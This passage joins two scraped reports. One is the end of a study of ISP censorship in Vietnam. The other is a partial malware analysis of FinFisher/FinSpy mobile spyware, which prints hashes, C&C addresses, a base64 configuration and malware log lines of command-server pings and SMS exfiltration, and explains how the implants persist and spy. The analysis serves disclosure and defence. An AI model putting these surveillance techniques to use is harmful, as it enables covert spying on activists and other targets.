(“Lab Results”) for an attempt to access http://paulusleson.wordpress.com.\nFigure 1 – Side-by-side comparison of header results from VNPT (“Field Results”) and control case (“Lab Results”) for an attempt to access http://paulusleson.wordpress.com. Note DNS resolution of 127.0.0.1 fromVNPT.\n(Click image to enlarge)\n\nViettel and FPT did not return an IP address for filtered sites, a result that can be difficult to differentiate from benign network errors. In order to account for intermittent network errors, tests were run over multiple days spanning several months. For both Viettel and FPT, filtered sites failed to properly resolve the domain name during every test. See Figure 2 for a side-by-side comparison of the headers received from Viettel (“Field Results”) and from the control in Canada (“Lab Results”) for an attempt to access http://www.voanews.com/Vietnamese.\nFigure 2 – Side-by-side comparison of header results from Viettel (“Field Results”) and control case (“Lab Results”) for an attempt to access http://www.voanews.com/Vietnamese\n(Click image to enlarge)\n\nThe three ISPs were found to block similar types of content, and there was significant overlap in many of the sites found to be blocked. In general, the majority of content found blocked on all three ISPs was Vietnam-specific, including critical political blogs, news sites, and sites of domestic and international NGOs. Some non-Vietnamese content was found to be blocked on all three, including sites of anonymization and circumvention tools and web-hosting services.\nA number of websites associated with imprisoned bloggers were also found blocked. The blog of Paulus Le Son (http://paulusleson.wordpress.com) was found blocked on Viettel and VNPT. Independent news site Dan Chim Viet (http://www.danchimviet.info), for which imprisoned blogger Lu Van Bay had written, was blocked on Viettel and FPT. Vietnam Redemptorist News (http://www.chuacuuthe.com/), a site that had featured contributions from arrested bloggers Dang Xuan Dieu, Ho Duc Hoa, and Nguyen Van Duyet, was found blocked on Viettel and FPT. Environmental blog Bauxite Vietnam (http://www.boxitvn.net), for which imprisoned blogger Nong Hung Anh wrote, was found blocked on FPT and Viettel.\nAll three ISPs blocked websites related to the Montagnard indigenous peoples (such as http://www.montagnard-foundation.org and http://www.mhro.org/), as well as Vietnamese news sites (e.g., http://www.vietbao.com/ and http://www.saigonbao.com/) and sites belonging to Vietnamese political organizations (e.g., http://phvn.org and http://www.viettan.org).\nBlocking, however, was not entirely consistent across ISPs. As already mentioned, Viettel was found to block the greatest number of URLs of the three ISPs tested. It generally blocked Vietnam-related political and news content, as well as some content hosting services (http://www.angelfire.com and http://groups.yahoo.com) and U.S. military websites. Viettel blocked a number of political blogs (including http://danlambaovn.blogspot.ca, http://diendanctm.blogspot.com, http://danluanvietnam.wordpress.com, http://danchutudochovietnam.blogspot.com, and http://www.nuvuongcongly.net) and religious sites (such as http://www.catholic.org and http://www.caodai.net), as well as a number of international news sites (http://www.rfa.org, http://www.rfi.fr, and http://www.voanews.com) and NGO sites (http://www.freedomhouse.org and http://www.hrw.org).\nFPT was found to block fewer total URLs than Viettel, although it blocked similar types of content. The vast majority of sites found blocked on FPT were also blocked on Viettel. VNPT was found to block the fewest URLs of the three ISPs tested. The type of content found to be filtered was similar to the other two ISPs; notably, however, it was the only one of the three found to block access to Facebook. VNPT was also found to block a number of critical political blogs (such as http://nghiathuc.wordpress.com, http://doithoaionline.wordpress.com, and http://tiengnoidanchu.wordpress.com) which were not found to be blocked on Viettel or FPT.\nIt is not clear why such variation in filtering exists between ISPs, a finding that has been consistent across all phases of ONI testing. Both Viettel and VNPT are state-owned enterprises, with Viettel operated by the military, while FPT is privately owned. However this alone does not explain the variation as VNPT was found to filter fewer total URLs than FPT. The relatively small number of URLs found to be blocked on all three ISPs suggests that they do not share a common list of URLs to block.\nConclusion\nVietnam remains a heavily restricted information space, with a consistently strict Internet filtering regime and ongoing targeting of critical bloggers. The introduction of regulations that would provide new powers to censor and criminalize Internet use threatens Vietnam’s information space even further. The ongoing harassment, intimidation, and detainment of bloggers, combined with the potential for new real-name registration requirements, make Vietnam a dangerous environment in which to express dissent.\nAcknowledgements\nThe OpenNet Initiative would like to thank Trinh Nguyen (Viet Tan) and Human Rights Watch for contextual research assistance.

    "text": "\n\t\t\t\tDownload PDF\nThis post describes our work analyzing several samples which appear to be mobile variants of the FinFisher Toolkit, and ongoing scanning we are performing that has identified more apparent FinFisher command and control servers.\nIntroduction\nEarlier this year, Bahraini Human Rights activists were targeted by an email campaign that delivered a sophisticated Trojan. In From Bahrain with Love: FinFisher’s Spy Kit Exposed? we characterized the malware, and suggested that it appeared to be FinSpy, part of the FinFisher commercial surveillance toolkit. Vernon Silver concurrently reported our findings in Bloomberg, providing background on the attack and the analysis, and highlighting links to FinFisher’s parent company, Gamma International.\nAfter these initial reports, Rapid7, a Boston-based security company, produced a follow-up analysis that identified apparent FinFisher Command and Control (C&C) servers on five continents. After the release of the Rapid7 report, Gamma International representatives spoke with Bloomberg and The New York Times’ Bits Blog, and denied that the servers found in 10 countries were instances of their products.\nFollowing these analyses, we were contacted by both the security and activist communities with potentially interesting samples. From these, we identified several apparent mobile Trojans for the iOS, Android, BlackBerry, Windows Mobile and Symbian platforms. Based on our analysis, we found these tools to be consistent in functionality with claims made in the documentation for the FinSpy Mobile product, a component of the FinFisher toolkit. Several samples appear to be either demo versions or “unpackaged” versions ready to be customized, while others appear to be samples in active use.\nPromotional literature describes this product as providing:\n\nRecording of common communications like Voice Calls, SMS/MMS and Emails\nLive Surveillance through silent calls\nFile Download (Contacts, Calendar, Pictures, Files)\nCountry Tracing of Target (GPS and Cell ID)\nFull Recording of all BlackBerry Messenger communications\nCovert Communications with Headquarters\n\nIn addition to analysis of these samples, we are conducting an ongoing scan for FinFisher C&C servers, and have identified potential servers in the following countries: Bahrain, Brunei, the Czech Republic, Ethiopia, Indonesia, Mongolia, Singapore, the Netherlands, Turkmenistan, and the United Arab Emirates (UAE).\nMobile Trojans\niOS\nIt was developed for Arm7, built against iOS SDK 5.1 on OSX 10.7.3 and it appears that it will run on iPhone 4, 4S, iPad 1, 2, 3, and iPod touch 3, 4 on iOS 4.0 and up.\nThe bundle is called “install_manager.app” and the contents of it are:\n99621a7301bfd00d98c222a89900aeef ./data\n1f73ebf8be52aa14d4d4546fb3242728 ./_CodeSignature/CodeResources\n9273880e5baa5ac810f312f8bd29bd3f ./embedded.mobileprovision\n2cbe06c89dc5a43ea0e0600ed496803e ./install_manager\n23b7d7d024abb0f558420e098800bf27 ./PkgInfo\n11e4821d845f369b610c31592f4316d9 ./Info.plist\nce7f5b3d4bfc7b4b0da6a06dccc515f2 ./en.lproj/InfoPlist.strings\n3fa32da3b25862ba16af040be3451922 ./ResourceRules.plist\nInvestigation of the Mach-0 binary ‘install_manager’ reveals the text “FinSpy”:\n\nFurther references to “FinSpy” were identified in the binary:\n/Users/adm/Code/development/FinSpyV2/src/iOS/CoreTarget/\n/Users/adm/Code/development/FinSpyV2/src/iOS/Installer/install_manager/install_manager/main.m\n/Users/adm/Code/development/FinSpyV2/src/iOS/Installer/install_manager/install_manager/zip/ioapi.c\n/Users/adm/Code/development/FinSpyV2/src/iOS/Installer/install_manager/install_manager/zip/unzip.c\n/Users/adm/Code/development/FinSpyV2/src/iOS/Installer/install_manager/install_manager/zip/crypt.h\n/Users/adm/Code/development/FinSpyV2/src/iOS/Installer/install_manager/install_manager/zip/zip.c\n/Users/adm/Code/development/FinSpyV2/src/iOS/Installer/install_manager/install_manager/zip/ZipArchive.mm\n/Users/adm/Code/development/FinSpyV2/src/iOS/Installer/install_manager/install_manager/../../../CoreTarget/CoreTarget/GIFileOps.mm\n/Users/adm/Code/development/FinSpyV2/src/iOS/Installer/install_manager/install_manager/../../../CoreTarget/CoreTarget/GIFileOps+Zip.m\n/Users/adm/Code/development/FinSpyV2/src/iOS/Installer/install_manager/install_manager/../../../CoreTarget/CoreTarget/GIPath.mm\nAdditionally, it appears that a developer’s certificate belonging to Martin Muench, who is described in The New York Times as Managing Director of Gamma International GmbH and head of the FinFisher product portfolio, is used:\n\nAn ad-hoc distribution profile is present: “testapp”:\nUUID: “E0A4FAD7-E414-4F39-9DB3-5A845D5124BC”.\nWill expire on 02.04.2013.\nThe profile matches the bundle ID (home.install-manager).\nThe profile was signed by 3 certificates.\nThe profile may be used by one developer:\nDeveloper Certificate “iPhone Distribution: Martin Muench”.\nThis certificate was used to sign the bundle.\nThe code signature contains 3 certificates:\nCertificate “Apple Root CA”:\nWill expire on 09.02.2035.\nYour keychain contains this root certificate.\nCertificate “Apple Worldwide Developer Relations Certification Authority”:\nWill expire on 14.02.2016.\nCertificate “iPhone Distribution: Martin Muench”:\nWill expire on 03.04.2013.\nSHA1 fingerprint: “1F921F276754ED8441D99FB0222A096A0B6E5C65”.\nThe Application has been provisioned to run on the following devices, represented here by their Unique Device Identifiers (UDID):\n31b4f49bc9007f98b55df555b107cba841219a21,\n73b94de27cb5841ff387078c175238d6abac44b2,\n0b47179108f7ad5462ed386bc59520da8bfcea86,\n320184fb96154522e6a7bd86dcd0c7a9805ce7c0,\n11432945ee0b84c7b72e293cbe9acef48f900628,\n5a3df0593f1b39b61e3c180f34b9682429f21b4f,\nb5bfa7db6a0781827241901d6b67b9d4e5d5dce8\nThe file is hidden using Spring Board options, and on execution the sample writes out logind.app to /System/Library/CoreServices. ‘logind’ exists on OSX but not normally on iOS.\nIt then installs: /System/Library/LaunchDaemons/com.apple.logind.plist\n\nThis creates persistence on reboot. It launches the logind process, then deletes install_manager.app.\nOn reboot it runs early in the boot process with ID 47:\n\nThis then drops SyncData.app. This application is signed, and the provisioning stipulates:\n“Reliance on this certificate by any party assumes acceptance of the then applicable standard terms and conditions of use, certificate policy and certification practice statements.”\nFurther legal analysis would be necessary to determine whether the program violated the terms of use at the time of its creation.\nThis application appears to provide functionality for call logging:\n/Users/adm/Code/development/FinSpyV2/src/iOS/CoreTarget/CoreTarget/MobileLoggingDataTLV.m\n_OBJC_METACLASS_$_MobileLoggingDataTLV\n_OBJC_CLASS_$_MobileLoggingDataTLV\nExfiltration of contacts:\n/Users/adm/Code/development/FinSpyV2/src/iOS/CoreTarget/CoreTarget/GIAddressBookModule.m\n/Users/adm/Library/Developer/Xcode/DerivedData/CoreTarget-gqciilooqcckafgxlngvjezpbymr/Build/Intermediates/CoreTarget.build/Release-iphoneos/SyncData.build/Objects-normal/armv7/GIAddressBookModule.o\n-[XXXVIII_cI getAddresses:]\n/Users/adm/Code/development/FinSpyV2/src/iOS/CoreTarget/CoreTarget/GIAddressBookModuleData.m\nTarget location enumeration:\n@_OBJC_CLASS_$_CLLocationManager\n/Users/adm/Code/development/FinSpyV2/src/iOS/CoreTarget/CoreTarget/GILocationManager.m\n/Users/adm/Library/Developer/Xcode/DerivedData/CoreTarget-gqciilooqcckafgxlngvjezpbymr/Build/Intermediates/CoreTarget.build/Release-iphoneos/SyncData.build/Objects-normal/armv7/GILocationManager.o\nAs well as arbitrary data exfiltration, SMS interception and more.\nSyncData.app exfiltrates base64 encoded data about the device (including the IMEI, IMSI etc) to a remote cellular number.\n\nThe ‘logind’ process attempts to talk to a remote command and control server, the configuration information for which appears to be stored in base64 encoded form in “SyncData.app/84C.dat”.\nThe _CodeSignature/CodeResources file suggests that install manager drops logind.app, SyncData.app and Trampoline.app (Trampoline.app has not been examined).\norg.logind.ctp.archive/logind.app/logind\norg.logind.ctp.archive/SyncData.app/SyncData\norg.logind.ctp.archive/trampoline.app/trampoline\nAndroid\nThe Android samples identified come in the form of APKs.\n2e96e343ac10f5d9ace680e456c083e4eceb108f7209aa1e849f11a239e7a682\n0d798ca0b2d0ea9bad251125973d8800ad3043e51d4cc6d0d57b971a97d3af2d\n72a522d0d3dcd0dc026b02ab9535e87a9f5664bc5587fd33bb4a48094bce0537\nThe application appears to install itself as “Android Services”:\n\nIt requests the following permissions:\nandroid.permission.ACCESS_COARSE_LOCATION\nandroid.permission.ACCESS_FINE_LOCATION\nandroid.permission.INTERNET\nandroid.permission.READ_PHONE_STATE\nandroid.permission.ACCESS_NETWORK_STATE\nandroid.permission.READ_CONTACTS\nandroid.permission.READ_SMS\nandroid.permission.SEND_SMS\nandroid.permission.RECEIVE_SMS\nandroid.permission.WRITE_SMS\nandroid.permission.RECEIVE_MMS\nandroid.permission.RECEIVE_BOOT_COMPLETED\nandroid.permission.PROCESS_OUTGOING_CALLS\nandroid.permission.ACCESS_NETWORK_STATE\nandroid.permission.ACCESS_WIFI_STATE\nandroid.permission.WAKE_LOCK\nandroid.permission.CHANGE_WIFI_STATE\nandroid.permission.MODIFY_PHONE_STATE\nandroid.permission.BLUETOOTH\nandroid.permission.RECEIVE_WAP_PUSH\nThe first 200 files in the apk are named “assets/Configurations/dummsX.dat”, where X is a number from 0-199. The files are 0 bytes in length. The file header entries in the compressed file are normal, but the directory header entries contain configuration information.\nThe code in the my.api.Extractor.getConfiguration() method opens up the APK file and searches for directory entry headers (PK\\x01\\x02) then copies 6 bytes from the entry starting at offset 36. These are the “internal file attributes” and “external file attributes” fields. The code grabs these sequences until it hits a 0 value.This creates a base64 encoded string.\nThe app decodes this string and stores it in a file named 84c.dat (similar to the iOS sample discussed earlier).\nHere’s the output from one of the samples:\nKQIAAJBb/gAhAgAAoDOEAAwAAABQE/4AAAAAABAAAABgV/4AAAAAAAAAAAAMAAAAQBX+AAAAAAAPAAAAcFj+AG1qbV9BTkQMAAAAQGGEACwBAAANAAAAkGSEAIKHhoGDJgAAAHA3gABkZW1vLWRlLmdhbW1hLWludGVybmF0aW9uYWwuZGUbAAAAcDeAAGZmLWRlbW8uYmxvZ2Rucy5vcmcMAAAAQDiAAFAAAAAMAAAAQDiAAFcEAAAMAAAAQDiAAFgEAAAVAAAAcGOEACs0OTE3MjY2NTM4MDAWAAAAcGqEACs0OTg5NTQ5OTg5OTA4DwAAAHBmhABtam1fQU5EDAAAAEBlhACmNqEPDAAAAEAh/gAoBAAADAAAAEANgAB7AAAADAAAAEBohAAAAAAADAAAAEA7gAAAAAAACgAAAJBghACtEAoAAACQYoQAwAAJAAAAsGeEAAAIAAAAkMZxAIwAAACQeYQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBAQEAAQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPQAAAJA0RQA1AAAAoDNFAAwAAABAQUUA6AMAAAwAAABAQEUALAEAAAkAAAAwQkUAAAwAAACQZIQAh4aFgQ==\nThe Base64 decoded hexdump is:\n\nNote that the hostnames demo-de.gamma-international.de and ff-demo.blogdns.org are suggestive of a demo or pre-customisation version of the FinSpy Mobile tool and are similar to domains identified in our previous report.\nWe identified samples structurally similar to this sample that spoke to servers in the United Kingdom and the Czech Republic:\nSample: 0d798ca0b2d0ea9bad251125973d8800ad3043e51d4cc6d0d57b971a97d3af2d\nCommand and Control: 212.56.102.38\nCountry: United Kingdom\nCompany: PlusNet Technologies\nSample: 2e96e343ac10f5d9ace680e456c083e4eceb108f7209aa1e849f11a239e7a682\nCommand and Control: 80.95.253.44\nCountry: Czech Republic\nCompany: T-Systems Czech Republic\nNote that the Czech sample speaks to the same command and control server previously identified by Rapid7.\nSymbian\nSamples for Nokia’s Symbian platform were identified:\n1e7e53b0d5fabcf12cd1bed4bd9ac561a3f4f6f8a8ddc5d1f3d2f3e2e9da0116 Symbian.sisx\neee80733f9664384d6bac4d4e27304748af9ee158d3c2987af5879ef83a59da0 mysym.sisx\nThe first sample (“Symbian.sisx”) identifies itself as “System Update” and appears to have been built on the 29th of May 2012, at 14:20:57 UTC.\nClick to enlarge\n\nThe certificate is registered to a jd@cyanengineeringservices.com. WHOIS information indicates that www.cyanengineeringservices.com was anonymously registered (date of first registration: 07-Mar-07) with GoDaddy using Domains By Proxy. Although it includes an attractive front page that states “Mobile Software Development” for “Windows Mobile, iPhone, Android, Symbian and Blackberry,” all links (e.g. “Products” “About Us” or “Contacts”) lead to an “under construction” blank page.\nThe sample contains the following components:\nClick to enlarge\n\nThe file “c:\\sys\\bin\\updater.exe” provides the main implant functionality. This requests the following capabilities1:\nPowerMgmt\nReadDeviceData\nTrustedUI\nSwEvent\nNetworkServices\nReadUserData\nWriteUserData\nLocation\nOf special note is the use of TrustedUI. As mentioned in the security section of the Nokia developer notes for Symbian:\n“Trusted UI dialogs are rare. They must be used only when confidentiality and security are critical: for instance for password dialogs. Normal access to the user interface and the screen does not require this.”\nThe second sample (“mysym.sisx”) identifies itself as “Installation File” and appears to be signed by the “Symbian CA I” for “Cyan Engineering Services SAL (offshore),” unlike the previous sample, which was registered to jd@cyanengineeringservices.com.\nClick to enlarge\n\nWe identified “Cyan Engineering Services SAL (offshore)” as also listed as the registrant on the parked domain www.it-intrusion.com, (Created: 08-Dec-11, also with GoDaddy). However, it-intrusion.com does not have a protected registrant. The registrant is listed2 as a company based in Beirut, Lebanon:\nCyan Engineering Services SAL (offshore)\nBroadway Center, 7th Floor\nHamra Street – Chouran 1102-2050\nBeirut, Beirut 00000\nLebanon\nDomain Domain Name: IT-INTRUSION.COM\nCreated: 08-Dec-11\nExpires: 08-Dec-13\nUpdated: 08-Dec-11\nAdministrative Contact: Debs, Johnny\nThe registrant information for Cyan Engineering Services SAL also connects to Gamma: the name “Johnny Debs” is associated with Gamma International: a Johnny Debs was listed as representing Gamma at the October 2011 Milpol in Paris, and the name occurs elsewhere in discussions of FinFisher.\nExamination of this sample reveals the domain demo-01.gamma-international.de potentially indicating a demo or pre-customisation copy.\n\nThe phone number +60123839897 also shows up in the sample. It has a Malaysian country code.\nBlackberry\nThe identified samples contained the following files:\nrlc_channel_mode_updater.cod\nrlc_channel_mode_updater-1.cod\nrlc_channel_mode_updater.jad\nThe .cod files are signed by RIM’s RBB, RCR, and RRT keys. RBB stands for “RIM BlackBerry Apps API,” which allows manipulation of BlackBerry apps, RCR stands for “RIM Crypto API,” which allows access to crypto libraries, and RRT stands for “RIM Runtime API,” which allows access to other phone functionality such as sending SMS messages.\nThe signature process is described in RIM’s documentation [pdf] about the Blackberry Signing Authority. First, a developer registers a public key with the Blackberry Signing Authority. In order to obtain a signed application, the developer submits a signature request (including his identity and a hash of the binary) signed with his private key to the Signing Authority. The Signing Authority verifies that the signer is authorized to make requests, and, if so, replies with a copy of the hash signed with the relevant RIM private key. The developer then appends the signature to his binary.\n\nThe .jad file contains the following hashes for the .cod files:\nRIM-COD-SHA1-1: 2d 0a a2 b3 54 97 f7 35 fb 40 77 8e e1 ca 7f 8f 3e a0 aa 04\nRIM-COD-SHA1: 0f 3b d8 d1 84 da 35 4e 10 94 89 c0 d6 08 70 ad 5e 7a f3 e0\nThe .jad file also contains a blob of base64 encoded data with the key “RIM-COD-Config.” This data contains the URL of the command & control server, TCP ports, phone numbers to exfiltrate data to via SMS, identifiers for the Trojan and target, active modules, and various other configuration parameters.\nDecoding this reveals the following servers and phone numbers:\n118.xx.xx.186 – Indonesia\n+6281310xxxxx4 – Indonesia\n+49456xxxxx6 – Germany\nUpon installation, the user is presented with the following screen:\n\nAs evidenced by the above screenshot, the app is listed as:\nTellCOM Systems LTD\nCommon Communication Update DSCH/USCH V32\nDirectly after installing, the application requests enhanced permissions:\n\nThe following screen pops up showing the requested permissions:\n\nScrolling down reveals:\n\nAfter the user accepts these permissions, the sample attempts to connect to both Internet-based and SMS-based command & control servers. Another sample we analyzed appeared to write a debug log to the device’s filesystem. The following information was observed written to the log regarding communication with command & control services.\nnet.rmi.device.api.fsmbb.phone.PhoneInterface – connecting to http://demo-01.gamma-international.de:1111/ping/XXXXXXXXXXXX;deviceside=true failed: net.rim.device.cldc.io.dns.DNSException: DNS error DNS error\nnet.rmi.device.api.fsmbb.core.com.protocol.HeartbeatProtocolSMS – Heartbeat type 11 (1346097705922)+ core hb content: XXXXX/123456783648138/666666553648138/12e/666/0/0///\nnet.rmi.device.api.fsmbb.core.com.SMSCommunication – 1346097743 Success: texting to: //+XXXXXXXXXX msg: XXXXX\nnet.rmi.device.api.fsmbb.core.com.protocol.HeartbeatProtocolSMS – Heartbeat type 11 (1346097705922)+ extended hb content: XXXXX/123456783648138/XXXXX/999/420/B9700 5.0.\nnet.rmi.device.api.fsmbb.core.com.SMSCommunication – 1346097743 Success: texting to: //+XXXXXXXXXX msg: XXXXX\nWe decompiled the Blackberry sample. We provide a high-level overview of the more interesting classes that we successfully decompiled:\nnet.rmi.device.api.fsmbb.config.ApnDatabase\nnet.rmi.device.api.fsmbb.config.ApnDatabase$APN\nThese appeared to contain a database comprising the following GSM APNs. The significance of this database is that it only includes a small set of countries and providers:\nGermany: web.vodafone.de, internet.t-mobile\nIndonesia: indosatgprs, AXIS, telkomsel, www.xlgprs.net, 3gprs\nBrazil: claro.com.br, wapgprs.oi.com.br, tim.br\nMexico: wap.telcel.com\nnet.rmi.device.api.fsmbb.core.AppMain\nThis appears to do the main app installation, as well as uninstallation. Installation includes negotiating for enhanced permissions, base64-decoding the “RIM-COD-Config” configuration, and setting up and installing the Configuration. If the configuration contains a “removal date,” then automatic removal is scheduled for this time. Installation also involves instantiating “listener” modules, as specified below:\nnet.rmi.device.api.fsmbb.core.listener.AddressBookObserver\nThis appears to listen for changes to the address book. It implements the net.rim.blackberry.api.pim.PIMListListener interface.\nnet.rmi.device.api.fsmbb.core.listener.CallObserver.*\nThis implements:\nnet.rim.blackberry.api.phone.PhoneListener\nnet.rim.blackberry.api.phone.phonelogs.PhoneLogListener\nnet.rim.device.api.system.KeyListener\nThis module logs and manipulates phone events, and appears to enable “remote listening” functionality, where the FinSpy Master can silently call an infected phone to listen to conversation in its vicinity (this is referred to as a SpyCall in the code). The module has a facility to hide incoming calls by manipulating the UI, cancelling buzzer and vibration alerts, and toggling the backlight. Upon instantiation, the module calls “*43#” to enable call waiting. If a remote listening call from the master is active, then legitimate incoming calls will trigger call waiting. The module detects these legitimate incoming calls, and places the SpyCall call on call waiting, presenting the legitimate incoming call to the user.\nnet.rmi.device.api.fsmbb.core.listener.EmailObserver\n \nThis appears to record sent and received email messages.\nnet.rmi.device.api.fsmbb.core.listener.MessengerObserver (Module #68)\n \nThis seems to record BBM messages. It appears to do this by periodically checking the path “file:///store/home/user/im/BlackBerry Messenger/”\nnet.rmi.device.api.fsmbb.core.listener.SMSObserver\n \nThis module implements:\nnet.rim.blackberry.api.sms.SendListener\nnet.rim.blackberry.api.sms.OutboundMessageListener\nContrary to its name, OutboundMessageListener allows listening for both incoming and outgoing SMS messages. This module also checks for incoming SMS commands from the FinSpy Master. These commands can include an “emergency configuration” update, that can include new addresses and phone numbers for the FinSpy Master.\nnet.rmi.device.api.fsmbb.core.listener.WAObserver (Module #82)\n \nThis appears to monitor WhatsApp, the popular proprietary cross-platform messaging application. It locates the WhatsApp process ID by searching for module names that contain the string “WhatsApp.”\nAt some point, the module calls getForegroundProcessId to see if the WhatsApp process ID is in the foreground. If so, it seems to take a screenshot of the WhatsApp application, via Display.Screenshot. It appears that this screenshot is checked via “.equals” to see if there is any new information on the WhatsApp screen. If there is new information, the screenshot is then JPEG encoded via JPEGEncodedImage.encode.\nnet.rmi.device.api.fsmbb.core.com.*\n \nAppears to contain the mechanics of communication with the command & control server, including the plaintext TLV-based wire protocol.\nWindows Mobile\nThe Windows Mobile samples we identified are:\n2ccbfed8f05e6b50bc739c86ce4789030c6bc9e09c88b7c9d41cbcbde52a2455\n507e6397e1f500497541b6958c483f8e8b88190407b307e997a4decd5eb0cd3a\n1ff1867c1a55cf6247f1fb7f83277172c443442d174f0610a2dc062c3a873778\nAll the samples appeared similar, most likely belonging to the same branch release. The relevant parts of the binary are stored in five different resources:\n\nThe first resource contains an OMA Client Provisioning XML file, which is used to store root certificates for running privileged/unprivileged code on the device. In this case it only contained some default example values shipped with Microsoft Windows Mobile SDK.\nThe second resource contains the actual dropped payload which contains all the Trojan functionalities.\nThe third resource contains a binary configuration file.\nThe fourth and fifth resources contain two additional DLL files which are dropped along with the payload.\n\nThe main implant is dropped as “services.exe” with the libraries dropped as mapiwinarm.dll and mswservice.dll.\nThe payload has the following attributes:\nFile size: 186640 bytes\nSHA256: 4b99053bc7965262e8238de125397d95eb7aac5137696c7044c2f07b175b5e7c\nThis is a multi-threaded and modular engine which is able to run and coordinate a series of events providing interception and monitoring capabilities. When the application starts, a core initialization function is invoked, responsible for preparing execution and launching the main thread.\nThe main thread consequently runs a set of core components on multiple threads:\n\nRoutines responsible for handling the “heartbeat” notifications.\nRoutines which control the execution of the Trojan and its components while monitoring the status of the device.\nA routine which can be used to “wake up” the device.\nA component which handles emergency SMS communications.\nA routine that initializes the use of the Radio Interface Layer.\nA core component that manages a set of surveillance modules.\n\nThe Trojan utilises a “Heartbeat Manager”, which is a set of functions and routines that, depending on the status of the device or monitored events, communicates notifications back to the command and control server.\nThese beacons are sent according the following events:\n\nFirst beacon.\nA specified time interval elapsing.\nThe device has low memory.\nThe device has low battery.\nThe device changed physical location.\nThe Trojan has recorded data available.\nThe device has connected to a cellular network.\nThe device has a data link available.\nThe device connects to a WiFi network.\nAn incoming / outgoing call starts.\nThe Mobile Country Code (MCC) or Mobile Network Code (MNC) ID changed.\nThe Trojan is being uninstalled.\nThe SIM changes.\n\nNotifications are sent via SMS, 3G and WiFi, according to availability. Consistent with other platforms, the windows mobile version appears to use base64 encoding for all communications.\nIn response to such notifications, the implant is able to receive and process commands such as:\nSTOP_TRACKING_CMD\nSTART_TRACKING_CMD\nRESEND_FIRST_HEARTBEAT_TCPIP_CMD\nRESEND_FIRST_HEARTBEAT_SMS_CMD\nREMOVE_LICENSE_INFO_CMD\nKEEP_CONNECTION_ALIVE_CMD IGNORED b/c it’s an SMS answer\nKEEP_CONNECTION_ALIVE_CMD\nREMOVE_AT_AGENT_REQUEST_CMD\nREMOVE_AT_MASTER_REQUEST_CMD\nREMOVE_MAX_INFECTION_REACHED_CMD\nThe command and control server is defined in the configuration file found in the third resource of the dropper. In this sample, the sample connected to the domain: demo-04.gamma-international.de\nThis suggests that such sample is either a demo version or “unpackaged” version ready to be customized.\nTogether with a DNS or IP command and control server, each sample appears to be provided with two phone numbers which are used for SMS notifications.\nThe core surveillance and offensive capabilities of the Trojan are implemented through the use of several different modules. These modules are initialized by a routine we called ModulesManager, which loads and launches them in separate threads:\n\nThere are multiple modules available, including:\n\nAddressBook: Providing exfiltration of details from contacts stored in the local address book.\nCallInterception: Used to intercept voice calls, record them and store them for later transmission.\nPhoneCallLog: Exfiltrates information on all performed, received and missed calls stored in a local log file.\nSMS: Records all incoming and outgoing SMS messages and stores them for later transmission.\nTracking: Tracks the GPS locations of the device.\n\nCall Interception\nIn order to manipulate phone calls, the Trojan makes use of the functions provided by RIL.dll, the Radio Interface Layer.\nSome of the functions imported and used can be observed below:\n\nPhoneCallLog\nIn order to exfiltrate call logs, the Trojan uses functions provided by the Windows Mobile Phone Library.\nUsing PhoneOpenCallLog() and PhoneGetCallLogEntry(), the implant is able to retrieve the following struct for each call being registered by the system:\ntypedef struct {\nDWORD cbSize;\nFILETIME ftStartTime;\nFILETIME ftEndTime;\nIOM iom;\nBOOL fOutgoing:1;\nBOOL fConnected:1;\nBOOL fEnded:1;\nBOOL fRoam:1;\nCALLERIDTYPE cidt;\nPTSTR pszNumber;\nPTSTR pszName;\nPTSTR pszNameType;\nPTSTR pszNote;\nDWORD dwLogFlags;\nCEIOD iodContact;\nCEPROPID pidProp;\n} CALLLOGENTRY, * PCALLLOGENTRY;\nThis contains timestamps, numbers, names and other data associated with a call.\nTracking\nThe physical tracking of the device uses the GPS Intermediate Driver functions available on the Windows Mobile/CE platform:\nClick to enlarge\n\nAfter a successful GPSOpenDevice() call, it invokes GPSGetPosition() which gives access to a GPS_POSITION struct containing the following information:\ntypedef struct _GPS_POSITION {\nDWORD dwVersion;\nDWORD dwSize;\nDWORD dwValidFields;\nDWORD dwFlags;\nSYSTEMTIME stUTCTime;\ndouble dblLatitude;\ndouble dblLongitude;\nfloat flSpeed;\nfloat flHeading;\ndouble dblMagneticVariation;\nfloat flAltitudeWRTSeaLevel;\nfloat flAltitudeWRTEllipsoid;\nGPS_FIX_QUALITY FixQuality;\nGPS_FIX_TYPE FixType;\nGPS_FIX_SELECTION SelectionType;\nfloat flPositionDilutionOfPrecision;\nfloat flHorizontalDilutionOfPrecision;\nfloat flVerticalDilutionOfPrecision;\nDWORD dwSatelliteCount;\nDWORD rgdwSatellitesUsedPRNs[GPS_MAX_SATELLITES];\nDWORD dwSatellitesInView;\nDWORD rgdwSatellitesInViewPRNs[GPS_MAX_SATELLITES];\nDWORD rgdwSatellitesInViewElevation[GPS_MAX_SATELLITES];\nDWORD rgdwSatellitesInViewAzimuth[GPS_MAX_SATELLITES];\nDWORD rgdwSatellitesInViewSignalToNoiseRatio[GPS_MAX_SATELLITES];\n} GPS_POSITION, *PGPS_POSITION;\nThis provides the latitude and longitude of the current location of the device.\nCommand and Control Server Scanning Results\nFollowing up on our earlier analysis, we scanned IP addresses in several countries looking for FinSpy command & control servers. At a high level, our scans probed IP addresses in each country, and attempted to perform the handshake distinctive to the FinSpy command and control protocol. If a server responded to the handshake, we marked it as a FinSpy node. We expect to release our scanning tools with a more complete description of methodology in a follow-up blog post.\nOur scanning yielded two key findings. First, we have identified several more countries where FinSpy Command and Control servers were operating. Scanning has thus far revealed two servers in Brunei, one in Turkmenistan’s Ministry of Communications, two in Singapore, one in the Netherlands, a new server in Indonesia, and a new server in Bahrain.\nSecond, we have been able to partially replicate the conclusions of an analysis by Rapid7, which reported finding FinSpy command & control servers in ten countries: Indonesia, Australia, Qatar, Ethiopia, Czech Republic, Estonia, USA, Mongolia, Latvia, and the UAE. We were able to confirm the presence of FinSpy on all of the servers reported by Rapid7 that were still available to be scanned. We confirmed FinSpy servers in Indonesia, Ethiopia, USA, Mongolia, and the UAE. The remaining servers were down at scanning time. We also noted that the server in the USA appeared to be an IP-layer proxy (e.g., in the style of Network Address Translation)3.\nRapid7’s work exploited a temporary anomaly in FinSpy command & control servers. Researchers at Rapid7 noticed that the command & control server in 